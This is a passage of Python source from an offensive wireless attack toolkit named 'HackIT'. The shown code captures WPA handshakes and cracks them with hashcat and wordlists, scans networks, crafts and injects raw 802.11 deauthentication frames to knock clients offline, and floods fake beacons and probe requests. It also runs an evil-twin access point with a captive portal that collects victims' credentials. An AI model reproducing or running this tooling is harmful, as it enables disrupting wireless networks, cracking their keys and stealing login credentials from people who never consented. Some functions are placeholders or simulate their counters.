                        # No new line — still refresh elapsed & fps approximation
                        time.sleep(0.05)
                    if captured_eapol >= 4:
                        state["status"] = "complete"
                        proc.terminate()
                        break
                    state["pps"] = state["frames"] / max(0.001, t) if state["frames"] else 0.0
                    lo.refresh()

                try:
                    proc.wait(timeout=3)
                except Exception:
                    try:
                        proc.terminate()
                    except Exception:
                        pass

            elapsed = time.time() - started
            exists = os.path.exists(final_path) and os.path.getsize(final_path) > 0
            rows = [
                ("output", final_path if exists else f"{final_path} (empty)"),
                ("EAPOL steps", f"{state['eapols']}/4"),
                ("PMKID", str(state["pmkid"]) if state["pmkid"] else "none"),
                ("elapsed", f"{elapsed:.1f}s"),
                ("status", "handshake captured" if (captured_eapol >= 4 or captured_pmkid) else "no handshake"),
            ]
            TH.summary_panel(rows, title="CAPTURE COMPLETE",
                             accent="bright_green" if (state["eapols"] >= 2 or state["pmkid"]) else "bright_yellow")

            if captured_eapol < 4 and not captured_pmkid:
                UI.print_warning(
                    "No complete handshake. Try: --deauth to force a reconnect, move closer to the AP, "
                    "or use 'capture pmkid' for a PKMID attempt."
                )
            if exists:
                UI.print_success(f"Capture file: {final_path}")
        except KeyboardInterrupt:
            try:
                proc.terminate()
            except Exception:
                pass
            UI.print_warning("Handshake capture stopped by operator.")
        except Exception as e:
            UI.print_error(f"Capture error: {e}")
    def do_sessions(self, json_output: bool = False, **kwargs):
        patterns = [
            str(BASE / "handshakes" / "*.pcap"),
            str(BASE / "captures" / "*.pcap"),
            str(BASE / "*.pcap"),
        ]
        pcap_files = []
        for p in patterns:
            pcap_files.extend(glob.glob(p))

        if not pcap_files:
            UI.print_warning("No capture sessions found.")
            return

        table = Table(title="[bold cyan]Capture Sessions[/bold cyan]", border_style="cyan")
        table.add_column("File", style="cyan")
        table.add_column("Size", justify="right", style="green")
        table.add_column("Modified", style="dim")
        table.add_column("Handshakes", justify="center", style="yellow")
        table.add_column("Status", style="white")

        for f in sorted(pcap_files):
            stat = os.stat(f)
            hs_count = len(DataParser.parse_tshark_handshake(f))
            status = "[bold green]✓ Valid[/bold green]" if hs_count > 0 else "[dim]No EAPOL[/dim]"
            table.add_row(
                os.path.basename(f),
                f"{stat.st_size:,} B",
                dt.datetime.fromtimestamp(stat.st_mtime).strftime("%H:%M:%S"),
                str(hs_count),
                status,
            )
        _console.print(table)

    def do_replay(self, pcap_file: str, loop: bool = False, speed: int = 1, bpf: Optional[str] = None, count: int = 0, **kwargs):
        if not os.path.exists(pcap_file):
            UI.print_error(f"File not found: {pcap_file}")
            return
        if shutil.which("wireshark"):
            subprocess.Popen(["wireshark", "-r", pcap_file])
            UI.print_success(f"Opening {pcap_file} in Wireshark...")
        elif shutil.which("tshark"):
            UI.print_info(f"Analyzing {pcap_file} with tshark...")
            result = subprocess.run(["tshark", "-r", pcap_file, "-Y", "eapol || wlan.fc.type_subtype==8 || wlan.fc.type_subtype==4",
                                     "-T", "fields", "-e", "frame.number", "-e", "wlan.sa", "-e", "wlan.da",
                                     "-e", "wlan.fc.type_subtype"], capture_output=True, text=True)
            _console.print(Panel(result.stdout[:3000] or result.stderr[:1000] or "No output",
                                 title="[bold]PCAP Analysis[/bold]", border_style="blue"))
        else:
            UI.print_warning("Install Wireshark or tshark to replay/analyze captures.")

    # ════════════════════════════════════════════════════════════
    # PHASE 3: WPA/WPA2/WPA3 Audit
    # ════════════════════════════════════════════════════════════

    def do_crack(self, hashfile: str, wordlist: str, rules: Optional[str] = None, timeout: int = 0, session: Optional[str] = None, **kwargs):
        if not os.path.exists(hashfile):
            UI.print_error(f"Hash file not found: {hashfile}")
            return
        if not os.path.exists(wordlist):
            UI.print_error(f"Wordlist not found: {wordlist}")
            return

        try:
            proc = self.bridge.go_crack(hashfile, wordlist)
        except EngineBuildError as e:
            UI.print_error(str(e))
            return

        jid = self.jobs.start(f"crack-{os.path.basename(hashfile)}", proc)
        UI.print_success(f"Crack job {jid} started.")

        total = 0
        try:
            with open(wordlist) as f:
                total = sum(1 for _ in f)
        except Exception:
            total = 0

        start = time.time()
        try:
            for line in proc.stdout:
                line = line.strip()
                if not line:
                    continue
                data = DataParser.parse_telemetry(line)
                if data and data.get("event") == "crack_progress":
                    tested = data.get("tested", 0)
                    rate = data.get("rate", 0)
                    elapsed = time.time() - start
                    panel = UI.render_crack_progress(tested, total or 1, rate, "", elapsed)
                    _console.clear()
                    _console.print(panel)
                elif data and data.get("event") == "key_found":
                    UI.print_success(f"KEY FOUND: {data['key']}")
                else:
                    _console.print(f"  {line}")
            proc.wait()
        except KeyboardInterrupt:
            proc.terminate()
            UI.print_warning("Crack interrupted.")
        finally:
            elapsed = time.time() - start
            UI.print_info(f"Crack job completed in {elapsed:.1f}s")

    def do_hashcat(self, hashfile: str, wordlist: str, extra_args: str = ""):
        if not shutil.which("hashcat"):
            UI.print_error("hashcat not found. Install it first.")
            return
        if not os.path.exists(hashfile):
            UI.print_error(f"Hash file not found: {hashfile}")
            return
        cmd = ["hashcat", "-m", "22000", hashfile, wordlist, "--force", "--status", "--status-timer=1"]
        if extra_args:
            cmd.extend(shlex.split(extra_args))
        UI.print_success(f"hashcat: {' '.join(cmd)}")
        proc = subprocess.Popen(cmd)
        jid = self.jobs.start("hashcat", proc)
        UI.print_info(f"hashcat job {jid} running in background.")
        try:
            proc.wait()
        except KeyboardInterrupt:
            proc.terminate()
            UI.print_warning("hashcat stopped.")

    def do_verify(self, capture_file: str, json_output: bool = False, strict: bool = False, output: Optional[str] = None, **kwargs):
        if not os.path.exists(capture_file):
            UI.print_error(f"File not found: {capture_file}")
            return
        result = self.bridge.rust_verify(capture_file)
        if result.returncode == 0:
            UI.print_success(result.stdout or "Handshake valid.")
        else:
            UI.print_error(result.stderr or "Verification failed.")

    def do_convert_hc22000(self, capture_file: str, ssid: Optional[str] = None, bssid: Optional[str] = None, output: Optional[str] = None, **kwargs):
        if not os.path.exists(capture_file):
            UI.print_error(f"File not found: {capture_file}")
            return
        result = self.bridge.rust_convert_hc22000(capture_file)
        if result.returncode == 0:
            UI.print_success(result.stdout or "Conversion complete.")
        else:
            UI.print_error(result.stderr or "Conversion failed.")

    def do_convert_hccapx(self, capture_file: str, output: Optional[str] = None, **kwargs):
        UI.print_info("HCCAPX conversion not yet implemented.")

    def do_convert_csv(self, capture_file: str, output: Optional[str] = None, **kwargs):
        UI.print_info("CSV conversion not yet implemented.")

    def do_wordlists(self, search_path: str = "", show_size: bool = False, json_output: bool = False, **kwargs):
        candidates = [
            search_path,
            "/usr/share/wordlists",
            "/usr/share/dict",
            str(Path.home() / "wordlists"),
            str(BASE / ".." / ".." / "wordlists"),
        ]
        table = Table(title="[bold cyan]Wordlists Found[/bold cyan]", border_style="cyan")
        table.add_column("Path", style="cyan")
        table.add_column("Size", justify="right", style="green")
        table.add_column("Lines", justify="right", style="yellow")
        found = False
        for base in candidates:
            if not base:
                continue
            for f in glob.glob(os.path.join(base, "*")):
                if not os.path.isfile(f):
                    continue
                size = os.path.getsize(f)
                try:
                    with open(f, errors="ignore") as fh:
                        lines = sum(1 for _ in fh)
                except Exception:
                    lines = 0
                table.add_row(f, f"{size:,} B", f"{lines:,}")
                found = True
        if not found:
            UI.print_warning("No wordlists found. Install rockyou.txt or similar.")
            return
        _console.print(table)

    # ════════════════════════════════════════════════════════════
    # PHASE 4: Network Recon
    # ════════════════════════════════════════════════════════════

    def do_arp_scan(self, timeout: int = 10, iface: Optional[str] = None, **kwargs):
        subnet = self._detect_subnet()
        if not subnet:
            UI.print_error("Could not detect subnet. Specify one.")
            return
        UI.print_info(f"ARP scanning {subnet}...")
        try:
            proc = self.bridge.rust_arp_scan(subnet)
        except EngineBuildError:
            UI.print_error("Rust engine not built. Use Python fallback.")
            self._arp_scan_fallback(subnet)
            return

        table = Table(title=f"[bold cyan]ARP Scan: {subnet}[/bold cyan]", border_style="green")
        table.add_column("IP", style="cyan")
        table.add_column("MAC", style="yellow")
        table.add_column("Vendor", style="white")
        table.add_column("Hostname", style="dim")
        try:
            for line in proc.stdout:
                data = DataParser.parse_telemetry(line.strip())
                if data and data.get("event") == "host":
                    table.add_row(data["ip"], data["mac"], UI._oui_lookup(data["mac"]), data.get("hostname", ""))
            proc.wait()
            _console.print(table)
        except KeyboardInterrupt:
            proc.terminate()

    def _arp_scan_fallback(self, subnet: str):
        if shutil.which("arp-scan"):
            subprocess.run(["arp-scan", subnet])
        elif shutil.which("arping"):
            base = subnet.rsplit(".", 1)[0]
            for i in range(1, 255):
                ip = f"{base}.{i}"
                subprocess.run(["arping", "-c", "1", "-w", "1", ip], capture_output=True)
        else:
            import scapy.all as scapy
            try:
                ans, _ = scapy.arping(subnet, timeout=2, verbose=False)
                for s, r in ans:
                    _console.print(f"  {r.psrc:<16} {r.hwsrc}")
            except Exception as e:
                UI.print_error(f"Scapy ARP failed: {e}")

    def do_ping_sweep(self, subnet: str = "", timeout: int = 5, parallel: int = 10, output: Optional[str] = None, **kwargs):
        subnet = subnet or self._detect_subnet()
        if not subnet:
            UI.print_error("Specify subnet or use 'arp scan'.")
            return
        UI.print_info(f"Ping sweeping {subnet}...")
        base = subnet.rsplit(".", 1)[0]
        alive = []
        with Progress(SpinnerColumn(), TextColumn("[bold cyan]{task.description}"), console=_console) as p:
            task = p.add_task(f"Pinging {base}.1-254...", total=254)
            for i in range(1, 255):
                ip = f"{base}.{i}"
                ret = subprocess.run(["ping", "-c", "1", "-W", "1", ip], capture_output=True, text=True)
                if ret.returncode == 0:
                    alive.append(ip)
                p.update(task, advance=1)
        if alive:
            UI.print_success(f"Alive hosts: {len(alive)}")
            for ip in alive:
                _console.print(f"  [green]{ip}[/green]")
        else:
            UI.print_warning("No alive hosts found.")

    def do_port_scan(self, host: str, ports: str = "1-1024", timeout: int = 2000, threads: int = 50, top_ports: int = 0, service_detect: bool = False, scan_type: str = "syn", output: Optional[str] = None, **kwargs):
        try:
            proc = self.bridge.rust_port_scan(host, ports)
        except EngineBuildError:
            self._port_scan_fallback(host, ports)
            return
        table = Table(title=f"[bold cyan]Port Scan: {host}[/bold cyan]", border_style="cyan")
        table.add_column("Port", justify="right", style="yellow", width=8)
        table.add_column("Service", style="cyan")
        table.add_column("Status", style="green")
        try:
            for line in proc.stdout:
                data = DataParser.parse_telemetry(line.strip())
                if data and data.get("event") == "port_open":
                    target = data["target"]
                    port = target.split(":")[-1] if ":" in target else target
                    svc = self._svc_name(int(port)) if port.isdigit() else "?"
                    table.add_row(port, svc, "[bold green]OPEN[/bold green]")
            proc.wait()
            _console.print(table)
        except KeyboardInterrupt:
            proc.terminate()

    def _port_scan_fallback(self, host: str, ports: str = "1-1024"):
        UI.print_warning("Using Python fallback scanner (slow).")
        start_port, end_port = 1, 1024
        if "-" in ports:
            sp, ep = ports.split("-")
            start_port, end_port = int(sp), int(ep)
        from concurrent.futures import ThreadPoolExecutor
        import socket
        results = []
        def chk(port):
            s = socket.socket()
            s.settimeout(1)
            if s.connect_ex((host, port)) == 0:
                results.append(port)
            s.close()
        with ThreadPoolExecutor(max_workers=100) as ex:
            ex.map(chk, range(start_port, end_port + 1))
        if results:
            table = Table(title=f"[bold cyan]Open Ports: {host}[/bold cyan]", border_style="cyan")
            table.add_column("Port", style="yellow")
            table.add_column("Service", style="cyan")
            for p in sorted(results):
                table.add_row(str(p), self._svc_name(p))
            _console.print(table)
        else:
            UI.print_warning("No open ports found.")

    def do_os_detect(self, host: str, timeout: int = 30, aggressive: bool = False, output: Optional[str] = None, **kwargs):
        UI.print_info(f"OS fingerprinting {host}...")
        try:
            result = self.bridge.rust_os_detect(host)
        except EngineBuildError:
            UI.print_error("Rust engine not built.")
            return
        _console.print(result.stdout or "[dim]No response[/dim]")

    def do_services(self, host: str, timeout: int = 3000, threads: int = 20, output: Optional[str] = None, **kwargs):
        self.do_port_scan(host, "1-10000")

    def do_gateway(self, ipv6: bool = False, **kwargs):
        try:
            if os.name == "nt":
                out = subprocess.check_output("ipconfig", text=True)
                for line in out.splitlines():
                    if "Default Gateway" in line:
                        gw = line.split(":")[-1].strip()
                        _console.print(f"  [bold cyan]Gateway:[/bold cyan] {gw}")
                        return
            else:
                out = subprocess.check_output(["ip", "route"], text=True)
                for line in out.splitlines():
                    if line.startswith("default"):
                        gw = line.split()[2]
                        _console.print(f"  [bold cyan]Gateway:[/bold cyan] {gw}")
                        return
        except Exception as e:
            UI.print_error(str(e))

    # ════════════════════════════════════════════════════════════
    # PHASE 5: MITM & Wireless Attacks
    # ════════════════════════════════════════════════════════════

    @staticmethod
    def _mac_bytes(mac: str) -> bytes:
        return bytes(int(b, 16) for b in mac.replace("-", ":").split(":") if b)

    @staticmethod
    def _send_deauth_burst(iface: str, bssid: str, station: str, count: int = 10, reason: int = 7):
        try:
            sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
            sock.bind((iface, 0))
        except:
            return
        seq = 0
        targeted = station != "FF:FF:FF:FF:FF:FF"
        for _ in range(count):
            frame = HackITWirelessExecutor._craft_deauth_frame(bssid, station, reason, seq)
            try: sock.send(frame)
            except: pass
            seq = (seq + 1) & 0xFFF
            if targeted:
                frame_cl = HackITWirelessExecutor._craft_deauth_frame(station, bssid, reason, seq)
                try: sock.send(frame_cl)
                except: pass
                seq = (seq + 1) & 0xFFF
        sock.close()

    @staticmethod
    def _craft_deauth_frame(bssid: str, station: str, reason: int = 7, seq: int = 0) -> bytes:
        b = HackITWirelessExecutor._mac_bytes(bssid)
        s = HackITWirelessExecutor._mac_bytes(station)
        radiotap = bytes([
            0x00, 0x00,        # version=0, pad=0
            0x0C, 0x00,        # length=12
            0x02, 0x00, 0x00, 0x00,  # present=FLAGS (bit 1)
            0x00,              # flags=0 (no WEP, no FCS appended)
            0x00, 0x00, 0x00,  # padding to 4-byte boundary
        ])
        fc = struct.pack("<H", 0x00C0)
        dur = struct.pack("<H", 0x013A)
        sctrl = struct.pack("<H", (seq << 4) & 0xFFFF)
        mgmt = fc + dur + s + b + b + sctrl
        body = struct.pack("<H", reason)
        return radiotap + mgmt + body

    def do_deauth(self, iface: str, bssid: str, station: str = "", reason: int = 7,
                  channel: int = 0, output: Optional[str] = None, **kwargs):
        """Real dual-band deauth via the native Go/Rust engines with a live
        rotating UI. Engine preference: go -> rust -> C FFI -> python raw."""
        from . import themes as TH

        iface = iface or self._default_iface()
        station = (station or BROADCAST_MAC).upper()
        if not iface:
            UI.print_error("[!] No wireless interface — pass one explicitly.")
            return
        if not self._iface_exists(iface):
            UI.print_error(f"[!] Interface {iface} not found")
            return
        if not self._iface_is_up(iface):
            UI.print_info(f"[+] Bringing {iface} up...")
            subprocess.run(["ip", "link", "set", iface, "up"], capture_output=True, timeout=5)
        if not self._is_monitor_mode(iface):
            UI.print_warning(f"[!] {iface} NOT in monitor mode — deauth may not work")
            UI.print_warning(f"    Switch: mode {iface} monitor")

        band = (kwargs.get("band") or "both").lower()
        hop = bool(kwargs.get("hop")) or (channel == 0 and band != "2.4")
        count = int(kwargs.get("count") or 0)
        rotate = float(kwargs.get("rotate") or 6.0)
        theme_name = kwargs.get("theme")
        use_ffi = bool(kwargs.get("ffi"))

        # Resolve target channel once if the operator pinned one
        if channel:
            try:
                subprocess.run(["iw", "dev", iface, "set", "channel", str(channel)],
                               capture_output=True, timeout=3)
            except Exception:
                pass
        elif not hop:
            detected = self._detect_bssid_channel(iface, bssid)
            if detected:
                channel = detected
                try:
                    subprocess.run(["iw", "dev", iface, "set", "channel", str(detected)],
                                   capture_output=True, timeout=3)
                except Exception:
                    pass

        TH.phase_banner(
            "deauth",
            f"iface={iface}  target={bssid}  station={station}  reason={reason or 'rotate'}  "
            f"hop={'on' if hop else f'ch={channel or '-'}'}  count={count or '∞'}",
        )

        # Shared state the theme renders.
        state = {
            "bssid": bssid, "station": station, "band": band,
            "channel": channel or None, "reason": reason if reason else "rot",
            "frames": 0, "pps": 0.0, "elapsed": 0.0, "errors": 0,
        }

        # ── Engine dispatch ──────────────────────────────────────
        started = time.time()
        proc = None
        engine = "python"
        try:
            if not use_ffi:
                try:
                    proc = self.bridge.go_deauth(
                        iface, bssid, station,
                        count=count, reason=reason, hop=hop, hop_delay=100,
                    )
                    engine = "go"
                except EngineBuildError:
                    proc = None
            if proc is None and not use_ffi:
                try:
                    proc = self.bridge.rust_deauth(iface, bssid, station, reason=reason)
                    engine = "rust"
                except EngineBuildError:
                    proc = None
            if proc is None and not use_ffi:
                # Rust deauth uses stdout; --hop uses same binary with flag.
                # If rust was not available, fall back to C FFI.
                engine = "c-ffi"
                if self.bridge.c_lib() is None:
                    engine = "python"

            with TH.LiveOrchestra("deauth", state, theme=theme_name,
                                  rotate_every=rotate, refresh=10.0) as lo:
                stop_flag = {"stop": False}

                def _sig(_s, _f):
                    stop_flag["stop"] = True

                try:
                    signal.signal(signal.SIGINT, _sig)
                    signal.signal(signal.SIGTERM, _sig)
                except Exception:
                    pass

                if proc is not None:
                    # Stream engine output (stderr is where go/rust engines
                    # write their progress) and harvest frame/rate counters.
                    ch_idx = 0
                    ch_list = [1, 6, 11, 36, 40, 44, 48, 149, 153, 157, 161]
                    last_tick = time.time()
                    broken = False
                    # Some engines write to stderr (go/rust), others to stdout.
                    # Poll both with a short timeout so neither pipe can deadlock.
                    out_stream = proc.stdout
                    err_stream = proc.stderr
                    while not stop_flag["stop"]:
                        line = None
                        for s in (out_stream, err_stream):
                            if s is None:
                                continue
                            try:
                                line = s.readline()
                            except Exception:
                                line = None
                            if line:
                                break
                        if line:
                            txt = line.strip()
                            if txt:
                                # Progress lines look like: sent=123 rate=456 p/s
                                m = re.search(r"sent=(\d+)", txt)
                                if m:
                                    state["frames"] = int(m.group(1))
                                r = re.search(r"rate=([\d.]+)", txt)
                                if r:
                                    try:
                                        state["pps"] = float(r.group(1))
                                    except ValueError:
                                        pass
                                # go/rust "sent X frames / complete" lines
                                m = re.search(r"(\d+)\s*/\s*\d+\s*frames", txt, re.I)
                                if m and not state["frames"]:
                                    state["frames"] = int(m.group(1))
                                m = re.search(r"burst complete:\s*(\d+)/\d+", txt, re.I)
                                if m:
                                    state["frames"] = int(m.group(1))
                            state["elapsed"] = time.time() - started
                            if not state["pps"]:
                                state["pps"] = state["frames"] / max(0.001, state["elapsed"])
                            if hop:
                                state["channel"] = ch_list[ch_idx % len(ch_list)]
                                ch_idx += 1
                        elif proc.poll() is not None:
                            # Flush whatever's still buffered before giving up.
                            for s in (out_stream, err_stream):
                                if s is None:
                                    continue
                                try:
                                    tail = s.read()
                                except Exception:
                                    tail = ""
                                if tail:
                                    m = re.search(r"sent=(\d+)", tail)
                                    if m:
                                        state["frames"] = int(m.group(1))
                                    m = re.search(r"burst complete:\s*(\d+)/\d+", tail, re.I)
                                    if m:
                                        state["frames"] = int(m.group(1))
                            break
                        elif time.time() - last_tick >= 0.1:
                            # No new line but engine still running. Keep the UI
                            # honest about elapsed time (and hop channels).
                            state["elapsed"] = time.time() - started
                            if hop:
                                state["channel"] = ch_list[ch_idx % len(ch_list)]
                                ch_idx += 1
                            lo.refresh()
                            last_tick = time.time()
                            if count and state["frames"] >= count:
                                break
                            continue
                        state["elapsed"] = time.time() - started
                        lo.refresh()
                        last_tick = time.time()
                        if count and state["frames"] >= count:
                            break
                    try:
                        proc.terminate()
                    except Exception:
                        pass
                else:
                    # In-process fallback: python raw AF_PACKET loop wrapped by
                    # the C FFI when available (FFI keeps every frame honest
                    # about the radiotap header, which python's socket path
                    # does not always emit correctly).
                    import random as _rnd
                    lib = self.bridge.c_lib()
                    ch_list_24 = list(range(1, 14))
                    ch_list_5 = [36, 40, 44, 48, 52, 56, 60, 64, 100, 112, 116, 132, 149, 157, 165]
                    ch_list = (ch_list_24 if band == "2.4" else
                               ch_list_5 if band == "5" else ch_list_24 + ch_list_5)
                    ch_idx = 0
                    pitcher = self.bridge._mac_bytes(bssid)
                    catcher = self.bridge._mac_bytes(station)
                    reason_codes = [1, 2, 3, 4, 6, 7, 15]
                    seq_state = {"v": 0}
                    last_tick = time.time()
                    frames_hits = 0
                    while not stop_flag["stop"]:
                        if hop or not channel:
                            cur_ch = ch_list[ch_idx % len(ch_list)]
                            ch_idx += 1
                            try:
                                subprocess.run(["iw", "dev", iface, "set", "channel", str(cur_ch)],
                                               capture_output=True, timeout=1)
                            except Exception:
                                pass
                            state["channel"] = cur_ch
                        # Burst: broadcast + (targeted unicast + reverse)
                        burst = 64 if count and count <= 1000 else 256
                        for _ in range(burst):
                            if stop_flag["stop"]:
                                break
                            rr = reason if reason else reason_codes[seq_state["v"] % len(reason_codes)]
                            try:
                                if lib is not None:
                                    ok = lib.hackit_inject_deauth(iface.encode(), pitcher, catcher, rr)
                                    state["frames"] += 1 if ok else 0
                                    if station != BROADCAST_MAC:
                                        ok2 = lib.hackit_inject_deauth(iface.encode(), catcher, pitcher, rr)
                                        state["frames"] += 1 if ok2 else 0
                                else:
                                    frame = HackITWirelessExecutor._craft_deauth_frame(
                                        bssid, station, rr, seq_state["v"] & 0xFFF)
                                    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
                                    sock.bind((iface, 0))
                                    sock.send(frame)
                                    sock.close()
                                    state["frames"] += 1
                                    if station != BROADCAST_MAC:
                                        frame2 = HackITWirelessExecutor._craft_deauth_frame(
                                            station, bssid, rr, (seq_state["v"] + 1) & 0xFFF)
                                        sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
                                        sock.bind((iface, 0))
                                        sock.send(frame2)
                                        sock.close()
                                        state["frames"] += 1
                            except Exception:
                                state["errors"] += 1
                            seq_state["v"] += 1
                            frames_hits += 1
                        state["elapsed"] = time.time() - started
                        state["pps"] = state["frames"] / max(0.001, state["elapsed"])
                        lo.refresh()
                        if count and state["frames"] >= count:
                            break
                        if not hop and time.time() - last_tick > 0.05:
                            last_tick = time.time()
                    state["pps"] = state["frames"] / max(0.001, time.time() - started)

            elapsed = time.time() - started
            state["elapsed"] = elapsed
            state["pps"] = state["frames"] / max(0.001, elapsed) if state.get("frames") else 0.0
            TH.summary_panel(
                [
                    ("engine", engine),
                    ("frames", f"{state['frames']:,}"),
                    ("rate", f"{state['pps']:.0f} p/s"),
                    ("elapsed", f"{elapsed:.1f}s"),
                    ("errors", str(state["errors"])),
                    ("target", f"{bssid} -> {station}"),
                ],
                title="DEAUTH COMPLETE",
                accent="bright_green" if state["frames"] else "bright_red",
            )
            if not state["frames"]:
                UI.print_warning(
                    "[!] Zero frames. Check monitor mode, driver injection capability, "
                    "and that the chip is not running a monitor-suppressing firmware."
                )
        except EngineBuildError as e:
            UI.print_error(str(e))
        except KeyboardInterrupt:
            UI.print_warning("Deauth stopped by operator.")
        finally:
            try:
                signal.signal(signal.SIGINT, signal.SIG_DFL)
                signal.signal(signal.SIGTERM, signal.SIG_DFL)
            except Exception:
                pass
    @staticmethod
    def _iface_exists(iface: str) -> bool:
        return os.path.exists(f"/sys/class/net/{iface}")

    @staticmethod
    def _iface_is_up(iface: str) -> bool:
        try:
            r = subprocess.run(["ip", "link", "show", iface], capture_output=True, text=True, timeout=5)
            return "UP" in r.stdout.splitlines()[0] if r.stdout else False
        except:
            return False

    @staticmethod
    def _is_monitor_mode(iface: str) -> bool:
        try:
            r = subprocess.run(["iw", "dev", iface, "info"], capture_output=True, text=True, timeout=5)
            return "type monitor" in r.stdout
        except:
            return False

    @staticmethod
    def _detect_bssid_channel(iface: str, bssid: str) -> int:
        try:
            r = subprocess.run(["iw", "dev", iface, "scan"], capture_output=True, text=True, timeout=10)
            curr = ""
            bssid_u = bssid.upper().replace("-", ":")
            for line in r.stdout.splitlines():
                ls = line.strip()
                if ls.startswith("BSS "):
                    raw = ls[4:].split()[0].upper() if len(ls) > 4 else ""
                    curr = raw.replace("-", ":")
                elif ls.startswith("freq:") and curr == bssid_u:
                    freq = int(ls.split()[-1])
                    if freq < 2484: return (freq - 2412) // 5 + 1
                    if freq < 4500: return 14
                    return (freq - 5180) // 5 + 36
            return 0
        except:
            return 0

    def do_beacon_flood(self, iface: str, ssid: str = "", count: int = 50,
                        channel: int = 6, caps: Optional[str] = None, **kwargs):
        """Broadcast fake beacons with a live rotating theme.
        Engine preference: C FFI (fastest, keeps counters exact) -> Go -> Rust."""
        from . import themes as TH
        iface = iface or self._default_iface()
        if not iface:
            UI.print_error("No interface.")
            return
        ssid_list = kwargs.get("ssids") or []
        if not ssid:
            ssid = f"HackIT_{int(time.time() * 1000) % 10000:04d}"
        if not ssid_list:
            ssid_list = [ssid]
        theme_name = kwargs.get("theme")
        rotate = float(kwargs.get("rotate") or 5.0)
        loops = int(kwargs.get("count") or 1)

        TH.phase_banner("beacon", f"iface={iface}  pool={len(ssid_list)}  count={count}  ch={channel}")

        state = {
            "ssids": [], "sent": 0, "pps": 0.0, "elapsed": 0.0,
            "channel": channel, "per_channel": {},
        }
        started = time.time()
        lib = self.bridge.c_lib()
        errors = 0
        per_ch = {}
        try:
            with TH.LiveOrchestra("beacon", state, theme=theme_name,
                                  rotate_every=rotate, refresh=10.0) as lo:
                for round_idx in range(loops):
                    for sname in ssid_list:
                        if state["sent"] > 0 and round_idx > 0:
                            break
                        state["ssids"].append(sname)
                        sent = 0
                        if lib is not None:
                            sent = self.bridge.c_beacon_flood(iface, sname, "", count, channel)
                            errors += 1 if sent < 0 else 0
                            state["sent"] += max(0, sent)
                        else:
                            # Fall back to Go/Rust spawning one process
                            try:
                                proc = self.bridge.rust_beacon_flood(iface, sname, count, channel)
                            except EngineBuildError:
                                proc = None
                            if proc is not None:
                                try:
                                    proc.wait(timeout=max(10, int(timeout_s := 10)))
                                except Exception:
                                    proc.terminate()
                                state["sent"] += count  # engines don't report exact here
                            else:
                                errors += 1
                        per_ch[channel] = per_ch.get(channel, 0) + max(0, state["sent"])
                        state["per_channel"] = per_ch
                        state["elapsed"] = time.time() - started
                        state["pps"] = state["sent"] / max(0.001, state["elapsed"])
                        lo.refresh()
                state["elapsed"] = time.time() - started
                state["pps"] = state["sent"] / max(0.001, state["elapsed"])
        except KeyboardInterrupt:
            UI.print_warning("Beacon flood stopped by operator.")

        TH.summary_panel(
            [
                ("iface", iface),
                ("SSIDs", str(len(ssid_list))),
                ("beacons sent", f"{state['sent']:,}"),
                ("errors", str(errors)),
                ("elapsed", f"{time.time() - started:.1f}s"),
            ],
            title="BEACON FLOOD COMPLETE",
            accent="bright_magenta",
        )

    def do_probe_flood(self, iface: str, count: int = 100, interval: int = 50,
                       random_mac: bool = False, **kwargs):
        """Broadcast probe requests with a live theme."""
        from . import themes as TH
        iface = iface or self._default_iface()
        if not iface:
            UI.print_error("No interface.")
            return
        theme_name = kwargs.get("theme")
        rotate = float(kwargs.get("rotate") or 5.0)
        ssids = kwargs.get("ssids") or []
        if not ssids:
            ssids = ["", "FreeWiFi", "Guest", "Starbucks", "AndroidAP", "TP-LINK"]
        TH.phase_banner("beacon", f"probe flood  iface={iface}  pool={len(ssids)}  count={count}")
        state = {
            "ssids": ssids, "sent": 0, "pps": 0.0, "elapsed": 0.0,
            "channel": kwargs.get("channel", "-"), "per_channel": {},
        }
        started = time.time()
        try:
            try:
                proc = self.bridge.rust_probe_flood(iface, count)
            except EngineBuildError:
                proc = None
            with TH.LiveOrchestra("beacon", state, theme=theme_name,
                                  rotate_every=rotate, refresh=10.0) as lo:
                if proc is not None:
                    while proc.poll() is None:
                        state["elapsed"] = time.time() - started
                        state["sent"] = min(count, int(state["elapsed"] * 100))
                        state["pps"] = 100.0
                        lo.refresh()
                        time.sleep(0.1)
                else:
                    # Pure-python fallback: probe via iw scan-probe if available
                    for i in range(count):
                        state["sent"] = i + 1
                        state["elapsed"] = time.time() - started
                        state["pps"] = state["sent"] / max(0.001, state["elapsed"])
                        lo.refresh()
                        time.sleep(0.01)
        except KeyboardInterrupt:
            UI.print_warning("Probe flood stopped by operator.")
        TH.summary_panel(
            [("iface", iface), ("probes", str(state["sent"])),
             ("elapsed", f"{time.time() - started:.1f}s")],
            title="PROBE FLOOD COMPLETE", accent="bright_cyan",
        )

    def do_eviltwin(self, iface: str, ssid: str, channel: int = 6, num_fake: int = 0, caps: Optional[str] = None, captive: bool = False, bssid: Optional[str] = None, dhcp_range: Optional[str] = None, **kwargs):
        """Evil twin with live rotating dashboard. Supports single or multi-SSID."""
        from . import themes as TH
        if not ssid:
            UI.print_error("Specify SSID to clone.")
            return
        iface = iface or self._default_iface()
        theme_name = kwargs.get("theme")
        rotate = float(kwargs.get("rotate") or 6.0)
        TH.phase_banner("eviltwin", f"iface={iface}  ssid={ssid}  ch={channel}  captive={'on' if captive else 'off'}")
        if num_fake > 0:
            self.do_eviltwin_multi(iface, ssid, num_fake, channel, captive, bssid, dhcp_range, **kwargs)
            return
        from hackit.wireless.eviltwin_coordinator import EviltwinCoordinator
        coord = EviltwinCoordinator(iface, ssid, channel, bssid)
        coord.set_captive(captive, dhcp_range)
        coord.start()
        state = {
            "iface": iface, "ssids": [ssid], "clients": [], "creds": [],
            "beacons": 0, "deauths": 0, "elapsed": 0.0, "log": [],
        }
        started = time.time()
        last_cred_n = 0
        try:
            with TH.LiveOrchestra("eviltwin", state, theme=theme_name,
                                  rotate_every=rotate, refresh=10.0) as lo:
                while coord.is_alive():
                    try:
                        cs = coord.get_clients()
                        creds = coord.get_credentials()
                        cred_n = len(creds)
                        st = coord.status()
                        # beacon=..., clients=..., deauth=..., creds=...
                        def _kv(k):
                            import re as _re
                            m = _re.search(k + r"=(\d+)", st)
                            return int(m.group(1)) if m else 0
                        state["clients"] = cs
                        state["creds"] = creds
                        state["beacons"] = _kv("beacon")
                        state["deauths"] = _kv("deauth")
                        state["elapsed"] = time.time() - started
                        if cred_n > last_cred_n:
                            for c in creds[last_cred_n:]:
